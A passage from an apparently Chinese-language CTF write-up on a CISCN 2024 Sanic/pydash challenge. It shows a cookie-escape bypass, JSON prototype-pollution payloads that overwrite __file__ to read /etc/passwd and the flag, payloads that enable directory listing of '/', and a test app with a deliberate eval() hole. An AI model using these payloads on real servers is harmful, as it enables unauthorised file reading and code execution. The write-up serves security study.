</span></span><span class=line><span class=cl><span class=n>sec-ch-ua</span><span class=o>:</span> <span class=l>&#34;Not A(Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;132&#34;, &#34;Google Chrome&#34;;v=&#34;132&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-mobile</span><span class=o>:</span> <span class=l>?0</span>
</span></span><span class=line><span class=cl><span class=n>sec-ch-ua-platform</span><span class=o>:</span> <span class=l>&#34;Windows&#34;</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Site</span><span class=o>:</span> <span class=l>none</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Mode</span><span class=o>:</span> <span class=l>navigate</span>
</span></span><span class=line><span class=cl><span class=n>Sec-Fetch-Dest</span><span class=o>:</span> <span class=l>document</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br, zstd</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>user=&#34;adm\073n&#34;</span>
</span></span><span class=line><span class=cl><span class=n>sec-fetch-user</span><span class=o>:</span> <span class=l>?1</span>
</span></span></code></pre></td></tr></table></div></div><p>看到<code>/src</code>这里是使用的<code>open(__file__).read()</code>，也就是说如果我们能够污染或者说可控<code>__file__</code>就可以实现任意文件读取，看到<code>/admin</code></p><p><img src=/p/ciscn2024/QQ20250224-202127.jpg width=1942 height=1281 srcset="/p/ciscn2024/QQ20250224-202127_hu_cd1461d1e6ab076b.jpg 480w, /p/ciscn2024/QQ20250224-202127_hu_628c8801a3783d8d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=151 data-flex-basis=363px></p><p>发现使用了pydash，并且版本正确可以进行原型链污染，只不过这里需要绕过一下<code>_.</code>，这个绕过用<code>\</code>转义就可以绕过了，我们换上session就可以进行污染的尝试了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>44755604126b4cbe977d27e6616427e1
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;.__init__\\\\.__globals__\\\\.__file__&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;/etc/passwd&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>访问<code>/src</code>发现成功污染了，接着污染<code>/flag</code>，发现不对，可能是因为flag的名字并未是这个？也就是说我们必须要有个东西能够列出根目录的文件，才能够污染拿到flag，但是怎么找呢，由于这个代码非常简短所以很容易就引导我们去<code>app</code>应用查找</p><p><img src=/p/ciscn2024/QQ20250224-203621.jpg width=1032 height=204 srcset="/p/ciscn2024/QQ20250224-203621_hu_81b6413705e96af1.jpg 480w, /p/ciscn2024/QQ20250224-203621_hu_57c42c5c03efd3e4.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=505 data-flex-basis=1214px></p><p>跟进<code>static</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>static</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>uri</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>file_or_directory</span><span class=p>:</span> <span class=n>Union</span><span class=p>[</span><span class=n>PathLike</span><span class=p>,</span> <span class=nb>str</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>pattern</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;/?.+&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>use_modified_since</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>use_content_range</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>stream_large_files</span><span class=p>:</span> <span class=n>Union</span><span class=p>[</span><span class=nb>bool</span><span class=p>,</span> <span class=nb>int</span><span class=p>]</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>name</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s2>&#34;static&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>host</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>strict_slashes</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>bool</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>content_type</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>apply</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>True</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>resource_type</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>index</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=n>Union</span><span class=p>[</span><span class=nb>str</span><span class=p>,</span> <span class=n>Sequence</span><span class=p>[</span><span class=nb>str</span><span class=p>]]]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>directory_view</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>directory_handler</span><span class=p>:</span> <span class=n>Optional</span><span class=p>[</span><span class=n>DirectoryHandler</span><span class=p>]</span> <span class=o>=</span> <span class=kc>None</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;&#34;&#34;Register a root to serve files from. The input can either be a file or a directory.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        This method provides an easy and simple way to set up the route necessary to serve static files.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        Args:
</span></span></span><span class=line><span class=cl><span class=s2>            uri (str): URL path to be used for serving static content.
</span></span></span><span class=line><span class=cl><span class=s2>            file_or_directory (Union[PathLike, str]): Path to the static file
</span></span></span><span class=line><span class=cl><span class=s2>                or directory with static files.
</span></span></span><span class=line><span class=cl><span class=s2>            pattern (str, optional): Regex pattern identifying the valid
</span></span></span><span class=line><span class=cl><span class=s2>                static files. Defaults to `r&#34;/?.+&#34;`.
</span></span></span><span class=line><span class=cl><span class=s2>            use_modified_since (bool, optional): If true, send file modified
</span></span></span><span class=line><span class=cl><span class=s2>                time, and return not modified if the browser&#39;s matches the
</span></span></span><span class=line><span class=cl><span class=s2>                server&#39;s. Defaults to `True`.
</span></span></span><span class=line><span class=cl><span class=s2>            use_content_range (bool, optional): If true, process header for
</span></span></span><span class=line><span class=cl><span class=s2>                range requests and sends  the file part that is requested.
</span></span></span><span class=line><span class=cl><span class=s2>                Defaults to `False`.
</span></span></span><span class=line><span class=cl><span class=s2>            stream_large_files (Union[bool, int], optional): If `True`, use
</span></span></span><span class=line><span class=cl><span class=s2>                the `StreamingHTTPResponse.file_stream` handler rather than
</span></span></span><span class=line><span class=cl><span class=s2>                the `HTTPResponse.file handler` to send the file. If this
</span></span></span><span class=line><span class=cl><span class=s2>                is an integer, it represents the threshold size to switch
</span></span></span><span class=line><span class=cl><span class=s2>                to `StreamingHTTPResponse.file_stream`. Defaults to `False`,
</span></span></span><span class=line><span class=cl><span class=s2>                which means that the response will not be streamed.
</span></span></span><span class=line><span class=cl><span class=s2>            name (str, optional): User-defined name used for url_for.
</span></span></span><span class=line><span class=cl><span class=s2>                Defaults to `&#34;static&#34;`.
</span></span></span><span class=line><span class=cl><span class=s2>            host (Optional[str], optional): Host IP or FQDN for the
</span></span></span><span class=line><span class=cl><span class=s2>                service to use.
</span></span></span><span class=line><span class=cl><span class=s2>            strict_slashes (Optional[bool], optional): Instruct Sanic to
</span></span></span><span class=line><span class=cl><span class=s2>                check if the request URLs need to terminate with a slash.
</span></span></span><span class=line><span class=cl><span class=s2>            content_type (Optional[str], optional): User-defined content type
</span></span></span><span class=line><span class=cl><span class=s2>                for header.
</span></span></span><span class=line><span class=cl><span class=s2>            apply (bool, optional): If true, will register the route
</span></span></span><span class=line><span class=cl><span class=s2>                immediately. Defaults to `True`.
</span></span></span><span class=line><span class=cl><span class=s2>            resource_type (Optional[str], optional): Explicitly declare a
</span></span></span><span class=line><span class=cl><span class=s2>                resource to be a `&#34;file&#34;` or a `&#34;dir&#34;`.
</span></span></span><span class=line><span class=cl><span class=s2>            index (Optional[Union[str, Sequence[str]]], optional): When
</span></span></span><span class=line><span class=cl><span class=s2>                exposing against a directory, index is  the name that will
</span></span></span><span class=line><span class=cl><span class=s2>                be served as the default file. When multiple file names are
</span></span></span><span class=line><span class=cl><span class=s2>                passed, then they will be tried in order.
</span></span></span><span class=line><span class=cl><span class=s2>            directory_view (bool, optional): Whether to fallback to showing
</span></span></span><span class=line><span class=cl><span class=s2>                the directory viewer when exposing a directory. Defaults
</span></span></span><span class=line><span class=cl><span class=s2>                to `False`.
</span></span></span><span class=line><span class=cl><span class=s2>            directory_handler (Optional[DirectoryHandler], optional): An
</span></span></span><span class=line><span class=cl><span class=s2>                instance of DirectoryHandler that can be used for explicitly
</span></span></span><span class=line><span class=cl><span class=s2>                controlling and subclassing the behavior of the default
</span></span></span><span class=line><span class=cl><span class=s2>                directory handler.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        Returns:
</span></span></span><span class=line><span class=cl><span class=s2>            List[sanic.router.Route]: Routes registered on the router.
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>        Examples:
</span></span></span><span class=line><span class=cl><span class=s2>            Serving a single file:
</span></span></span></code></pre></td></tr></table></div></div><p>我们其实后面对每个属性都不用看，直接看两个属性，一个是<code>file_or_directory</code>，一个是<code>directory_view</code></p><p><img src=/p/ciscn2024/QQ20250224-204438.jpg width=2429 height=1362 srcset="/p/ciscn2024/QQ20250224-204438_hu_bb3590ef33ba975c.jpg 480w, /p/ciscn2024/QQ20250224-204438_hu_c25c1adfe6c1073b.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=178 data-flex-basis=428px></p><p>该函数的作用是 <strong>为 Sanic 应用注册静态文件或静态目录</strong>，并返回注册的路由信息。</p><ul><li>如果 <code>file_or_directory</code> 是文件 → 访问该 URL 时直接返回该文件内容。</li><li>如果 <code>file_or_directory</code> 是目录 → 允许访问目录中的文件，甚至可以自动列出目录内容。</li></ul><p>也就是说，我们首先污染<code>directory_view</code>为<code>True</code>，然后污染<code>file_or_directory</code>为<code>/</code>，拿到文件名就可以污染flag了，但是下一步该如何呢，我们应该怎么去获取到这个类和属性呢，看到下面出现了很多<code>directory_handler</code>所以直接跟进到<code>DirectoryHandler</code>(个人推荐自己起Docker来进行动态调试)，</p><p><img src=/p/ciscn2024/QQ20250224-205159.jpg width=1885 height=1140 srcset="/p/ciscn2024/QQ20250224-205159_hu_9bc8db013386cfd8.jpg 480w, /p/ciscn2024/QQ20250224-205159_hu_ed829a596c3da274.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=165 data-flex-basis=396px></p><p>可以看到初始化的时候就得到了属性名，但是只是知道这个属性在这里，并不知道如何的去获得这个属性，<a class=link href=https://www.cnblogs.com/ljc-0923/p/10391799.html target=_blank rel=noopener>sanic资料</a> 在这篇文章里里面知道sanic自带路由，并且里面也有<code>app.add_route</code>怎么感觉可以注入内存马呢，不过这里我们先思考一下问题，那我们现在就是要获得注册的路由，<code>app.router.routes</code> 或<code>app.router.routes_layer</code>，那还是要自己起环境</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sanic</span> <span class=kn>import</span> <span class=n>Sanic</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>sanic.response</span> <span class=kn>import</span> <span class=n>text</span><span class=p>,</span> <span class=n>html</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pydash</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># pydash==5.1.2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Pollute</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Sanic</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>static</span><span class=p>(</span><span class=s2>&#34;/static/&#34;</span><span class=p>,</span> <span class=s2>&#34;./static/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/src&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>src</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>eval</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;rce&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=vm>__file__</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/admin&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>admin</span><span class=p>(</span><span class=n>request</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>value</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>json</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>key</span> <span class=ow>and</span> <span class=n>value</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=ow>is</span> <span class=nb>str</span> <span class=ow>and</span> <span class=s1>&#39;_.&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pollute</span> <span class=o>=</span> <span class=n>Pollute</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>pydash</span><span class=o>.</span><span class=n>set_</span><span class=p>(</span><span class=n>pollute</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=n>value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;success&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>text</span><span class=p>(</span><span class=s2>&#34;forbidden&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ciscn2024/QQ20250224-211317.jpg width=1845 height=57 srcset="/p/ciscn2024/QQ20250224-211317_hu_7d5c0be18937d6fa.jpg 480w, /p/ciscn2024/QQ20250224-211317_hu_e57ac6e62d389403.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=3236 data-flex-basis=7768px></p><p><code>/src?rce=print(app.router.routes[2])</code>得到<code>&lt;Route: name=__mp_main__.static path=static/&lt;__file_uri__:path>></code>，那我们访问的时候就是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=s2>&#34;key&#34;</span><span class=err>:</span><span class=s2>&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.routes[2]&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>不过后面尝试污染的时候发现这样子不行，并不能成功，必须要找个返回是列表的来进行访问，看gxn男神用的是<code>name_index</code>方法来进行访问的，我在网上查查资料也没找到，只能用这个了，直接打断点</p><p><img src=/p/ciscn2024/QQ20250224-214056.jpg width=1841 height=1443 srcset="/p/ciscn2024/QQ20250224-214056_hu_5382e002035767f7.jpg 480w, /p/ciscn2024/QQ20250224-214056_hu_a4309e851daabb2d.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=127 data-flex-basis=306px></p><p>然后我发现居然就打这个一个断点就能拿到答案了</p><p><img src=/p/ciscn2024/QQ20250224-214445.jpg width=2427 height=1431 srcset="/p/ciscn2024/QQ20250224-214445_hu_b6cffcd4daf76ca9.jpg 480w, /p/ciscn2024/QQ20250224-214445_hu_48640c11d346376b.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=169 data-flex-basis=407px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=kc>true</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>就可以把目录列出来了，访问<code>/stctic/</code>发现成功</p><p><img src=/p/ciscn2024/QQ20250224-214718.jpg width=1888 height=871 srcset="/p/ciscn2024/QQ20250224-214718_hu_971b8da0eef7b6f1.jpg 480w, /p/ciscn2024/QQ20250224-214718_hu_d3ee8a36be00edac.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=216 data-flex-basis=520px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;/&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>正准备拿flag呢，结果发现这样报错了，我们再次调试看看是为啥</p><p><img src=/p/ciscn2024/QQ20250224-215202.jpg width=2341 height=1338 srcset="/p/ciscn2024/QQ20250224-215202_hu_e69ca9062c26e0f1.jpg 480w, /p/ciscn2024/QQ20250224-215202_hu_51d2c6f610eed6fa.jpg 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=174 data-flex-basis=419px></p><p>原来<code>directory</code>是一个对象，并且<code>parts</code>才是路径，回到最开始的跟进，我们跟进<code>parts</code>，结果发现根本找不到<code>_parts</code>这个属性，然后尝试污染一下，发现仍然是报错，可能最新版的sanic已经没有了？感兴趣的师傅可以降版本回去找到这个，</p><p>经过本人的多次尝试可以知道他肯定是没有这个属性了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/src/?rce=print(app.router.name_index[&#39;__mp_main__.static&#39;].handler.keywords[&#39;directory_handler&#39;].directory[&#39;_parts&#39;])
</span></span><span class=line><span class=cl># 结果报错
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/src/?rce=print(app.router.name_index[&#39;__mp_main__.static&#39;].handler.keywords[&#39;directory_handler&#39;].directory)
</span></span><span class=line><span class=cl># E:\PyCharm\object\test\flask_demo\static
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/src/?rce=print(app.router.name_index[&#39;__mp_main__.static&#39;].handler.keywords[&#39;directory_handler&#39;].directory_view)
</span></span><span class=line><span class=cl># False
</span></span></code></pre></td></tr></table></div></div><p>本来预期是返回一个列表，然后赋值即可，现在只能靠ctfshow的复现环境来了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;/&#34;</span><span class=p>]}</span>
</span></span></code></pre></td></tr></table></div></div><p>拿到<code>24bcbd0192e591d6ded1_flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;key&#34;</span><span class=p>:</span><span class=s2>&#34;.__init__\\\\.__globals__\\\\.__file__&#34;</span><span class=p>,</span><span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;/24bcbd0192e591d6ded1_flag&#34;</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>顺便写个一把梭哈的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
